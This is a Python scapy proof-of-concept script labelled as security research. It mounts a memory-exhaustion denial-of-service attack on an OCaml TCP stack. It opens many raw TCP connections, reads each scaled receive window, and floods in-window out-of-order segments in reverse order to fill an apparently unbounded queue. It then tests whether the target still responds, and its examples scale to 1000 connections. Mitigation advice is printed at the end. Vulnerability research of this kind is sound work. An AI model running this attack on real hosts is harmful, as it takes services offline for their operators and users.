#!/usr/bin/env python3
"""
Out-of-Order Segment Memory Exhaustion DoS PoC (CORRECTED VERSION)

This version sends out-of-order segments WITHIN the receive window,
as required by Window.valid() in window.ml:106-112.

The original version sent segments far beyond the window which were dropped.
This version:
1. Gets the actual window size from SYN-ACK
2. Sends segments within [rx_nxt, rx_nxt + window]
3. Uses multiple connections to amplify the attack

Author: Security Research
License: Educational/Research Use Only
"""

import argparse
import sys
import time
import random
from scapy.all import *

class OOOSegmentDoSV2:
    def __init__(self, target_ip, target_port, num_connections=10, segments_per_conn=50):
        self.target_ip = target_ip
        self.target_port = target_port
        self.num_connections = num_connections
        self.segments_per_conn = segments_per_conn
        self.connections = []
        self.total_segments_sent = 0

    def establish_connection(self, source_port):
        """Establish a connection and get window parameters"""
        ip = IP(dst=self.target_ip)
        syn = TCP(sport=source_port, dport=self.target_port,
                  flags='S', seq=1000)
        syn_ack = sr1(ip/syn, timeout=2, verbose=0)

        if not syn_ack or not syn_ack.haslayer(TCP) or syn_ack[TCP].flags != 'SA':
            return None

        # Get window scaling
        wscale = 0
        for opt in syn_ack[TCP].options:
            if isinstance(opt, tuple) and opt[0] == 'WScale':
                wscale = opt[1]
                break

        # Complete handshake
        ack = TCP(sport=source_port, dport=self.target_port,
                  flags='A', seq=syn_ack[TCP].ack, ack=syn_ack[TCP].seq + 1)
        send(ip/ack, verbose=0)

        actual_window = syn_ack[TCP].window << wscale

        return {
            'sport': source_port,
            'our_seq': syn_ack[TCP].ack,
            'their_seq': syn_ack[TCP].seq + 1,
            'window': actual_window,
            'wscale': wscale
        }

    def fill_ooo_queue(self, conn):
        """Fill the out-of-order queue for one connection within window constraints"""
        ip = IP(dst=self.target_ip)

        # Calculate max segments that fit in window
        segment_size = 1460
        max_segments_in_window = min(
            conn['window'] // segment_size,
            self.segments_per_conn
        )

        print(f"[*] Connection {conn['sport']}: Sending {max_segments_in_window} OOO segments")
        print(f"    Window: {conn['window']} bytes")
        print(f"    Max segments in window: {conn['window'] // segment_size}")

        # Strategy: Send segments in reverse order within the window
        # This maximizes out-of-order queue usage
        segments_sent = 0

        for i in range(max_segments_in_window):
            # Calculate sequence number within window
            # Send in reverse order: last segment first
            offset = (max_segments_in_window - i - 1) * segment_size

            # Make sure we stay within the window
            if offset + segment_size > conn['window']:
                continue

            seq = conn['our_seq'] + offset
            payload = b'X' * segment_size

            pkt = TCP(sport=conn['sport'], dport=self.target_port,
                     flags='A', seq=seq, ack=conn['their_seq'])

            send(ip/pkt/payload, verbose=0)
            segments_sent += 1
            self.total_segments_sent += 1

        return segments_sent

    def run_attack(self):
        """Execute the attack with multiple connections"""
        print(f"\n[*] Opening {self.num_connections} connections")
        print(f"[*] Each will send {self.segments_per_conn} out-of-order segments")
        print()

        base_port = random.randint(10000, 30000)

        # Phase 1: Establish connections
        for i in range(self.num_connections):
            sport = base_port + i
            if sport > 65535:
                break

            conn = self.establish_connection(sport)
            if conn:
                self.connections.append(conn)

            if (i + 1) % 10 == 0:
                print(f"\r[*] Established {i+1}/{self.num_connections} connections", end='', flush=True)

        print(f"\n[+] Successfully established {len(self.connections)} connections")

        if not self.connections:
            print("[-] No connections established!")
            return False

        # Show stats for first connection
        if self.connections:
            first = self.connections[0]
            print(f"\n[*] Example connection:")
            print(f"    Window: {first['window']} bytes")
            print(f"    Max OOO segments per connection: {first['window'] // 1460}")
            print(f"    Expected total OOO segments: ~{len(self.connections) * (first['window'] // 1460)}")
            print(f"    Expected memory usage: ~{len(self.connections) * first['window'] / (1024*1024):.1f} MB")

        time.sleep(2)

        # Phase 2: Fill OOO queues
        print(f"\n[*] Filling out-of-order queues...")
        start_time = time.time()

        for idx, conn in enumerate(self.connections):
            sent = self.fill_ooo_queue(conn)

            if (idx + 1) % 5 == 0 or (idx + 1) == len(self.connections):
                elapsed = time.time() - start_time
                rate = self.total_segments_sent / elapsed if elapsed > 0 else 0
                progress = ((idx + 1) / len(self.connections)) * 100
                print(f"\r[*] Progress: {progress:.0f}% | Segments: {self.total_segments_sent} | Rate: {rate:.1f} pps", end='', flush=True)

        elapsed = time.time() - start_time
        print(f"\n\n[+] Sent {self.total_segments_sent} out-of-order segments in {elapsed:.2f}s")
        print(f"[+] Rate: {self.total_segments_sent / elapsed:.1f} segments/sec")

        # Phase 3: Test responsiveness
        self.test_responsiveness()

        # Analysis
        self.analyze_impact()

        return True

    def test_responsiveness(self):
        """Test if connections are still responsive"""
        print("\n[*] Testing connection responsiveness...")

        responsive = 0
        unresponsive = 0

        for conn in self.connections[:5]:  # Test first 5
            ip = IP(dst=self.target_ip)

            # Try to send in-order data
            pkt = TCP(sport=conn['sport'], dport=self.target_port,
                     flags='PA', seq=conn['our_seq'], ack=conn['their_seq'])

            response = sr1(ip/pkt/b"PING", timeout=2, verbose=0)

            if response and response.haslayer(TCP):
                responsive += 1
            else:
                unresponsive += 1

        print(f"[+] Responsive: {responsive}/5")
        print(f"[-] Unresponsive: {unresponsive}/5")

        if unresponsive > 2:
            print("[!] Many connections unresponsive - possible DoS success!")
        elif unresponsive > 0:
            print("[~] Some connections affected")
        else:
            print("[+] All test connections still responsive")

    def analyze_impact(self):
        """Analyze attack impact"""
        print("\n" + "="*60)
        print("ATTACK ANALYSIS")
        print("="*60)

        if self.connections:
            avg_window = sum(c['window'] for c in self.connections) / len(self.connections)
            total_memory = sum(c['window'] for c in self.connections)

            print(f"Connections:          {len(self.connections)}")
            print(f"Segments Sent:        {self.total_segments_sent}")
            print(f"Avg Window Size:      {avg_window / 1024:.1f} KB")
            print(f"Expected OOO Memory:  ~{total_memory / (1024*1024):.1f} MB")
            print()

            # Per segment.ml:76-79, segments are stored in a Set
            # Each segment includes header + payload
            # Header: Tcp_packet.t (~80 bytes) + Cstruct.t pointer
            # Payload: Cstruct.t (1460 bytes)
            # Overhead: Set.Make overhead (~24 bytes per node)
            per_segment_memory = 1460 + 80 + 24  # ~1564 bytes
            estimated_memory = self.total_segments_sent * per_segment_memory

            print(f"More Accurate Estimate:")
            print(f"  Per segment memory:  ~{per_segment_memory} bytes")
            print(f"  Total for {self.total_segments_sent} segments: ~{estimated_memory / (1024*1024):.1f} MB")
            print()

            print("VULNERABILITY STATUS:")
            if self.total_segments_sent > 1000:
                print("  [!] DEMONSTRATED - Large number of OOO segments queued")
                print("  [!] segment.ml:81-92 - No queue size limit")
                print(f"  [!] Memory consumption: ~{estimated_memory / (1024*1024):.1f} MB")
            else:
                print("  [~] LIMITED IMPACT - Few segments sent")
                print("  [~] Increase connections or segments_per_conn")

            print()
            print("MITIGATION:")
            print("  - Add max OOO queue size (e.g., 100 segments)")
            print("  - Implement per-connection memory limits")
            print("  - Drop oldest OOO segments when limit reached")

        print("="*60)

def main():
    parser = argparse.ArgumentParser(
        description='Out-of-Order Segment Memory DoS PoC (Corrected)',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
CORRECTED ATTACK VECTOR:

The original PoC sent segments beyond the window which were dropped.
This version:

1. Gets actual window size from SYN-ACK (including scaling)
2. Sends segments WITHIN [rx_nxt, rx_nxt + window]
3. Uses multiple connections to amplify
4. Each connection can queue ~(window_size / 1460) segments

With 64KB windows: ~44 segments per connection
With 10 connections: ~440 segments (~640 KB)
With 100 connections: ~4400 segments (~6.4 MB)

Examples:
  # Small test (10 connections)
  sudo python3 ooo_segment_dos_v2.py --target 10.0.0.2 --port 8080 --connections 10

  # Medium test (100 connections)
  sudo python3 ooo_segment_dos_v2.py --target 10.0.0.2 --port 8080 --connections 100

  # Large test (1000 connections)
  sudo python3 ooo_segment_dos_v2.py --target 10.0.0.2 --port 8080 --connections 1000
        """)

    parser.add_argument('--target', required=True, help='Target IP')
    parser.add_argument('--port', type=int, required=True, help='Target port')
    parser.add_argument('--connections', type=int, default=10,
                       help='Number of connections (default: 10)')
    parser.add_argument('--segments', type=int, default=50,
                       help='Segments per connection (default: 50, max: window/1460)')

    args = parser.parse_args()

    if os.geteuid() != 0:
        print("[-] Root privileges required")
        sys.exit(1)

    print("""
╔═══════════════════════════════════════════════════════════╗
║  Out-of-Order Segment Memory DoS PoC (CORRECTED)          ║
║  Unbounded Queue Vulnerability Test - v2                  ║
╚═══════════════════════════════════════════════════════════╝
""")

    print("CORRECTIONS FROM v1:")
    print("  - Segments now WITHIN receive window")
    print("  - Uses multiple connections for amplification")
    print("  - Respects window size limits")
    print()

    attacker = OOOSegmentDoSV2(args.target, args.port,
                               args.connections, args.segments)
    attacker.run_attack()

if __name__ == '__main__':
    main()
